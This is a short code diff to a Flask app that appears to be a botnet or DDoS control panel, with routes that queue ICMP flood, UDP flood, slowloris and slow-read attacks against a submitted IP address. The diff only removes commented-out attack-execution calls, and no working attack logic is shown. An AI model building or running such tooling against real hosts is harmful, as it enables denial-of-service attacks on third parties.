@@ -46,11 +46,9 @@ def remove_botnet():
 @app.route("/icmp_flood", methods=["POST"])
 def icmp_flood():
     spoof = request.form.get('spoof_select')
-    # duration = int(request.form["attack_duration"])
     if(spoof == "yes"):
         ip_address = request.form["ip_address"]
         db.icmp_flood_insert(ip_address)
-    # attacks.execute_attack(attacks.icmp_flood, duration , ip_address)
     return "nothing"
 
 @app.route("/udp_flood", methods=["POST", "GET"])
@@ -67,10 +65,6 @@ def slowloris():
     connection_rate = int(request.form["connection_rate"])
     attack_duration = int(request.form["attack_duration"])
     db.slowloris_insert(number_of_connections, connection_rate, attack_duration)
-
-    # attacks.execute_attack(
-    #     attacks.slowloris, attack_duration, number_of_connections, connection_rate, attack_duration
-    # )
     return "nothing"
 
 @app.route("/slow_read", methods=["POST"])
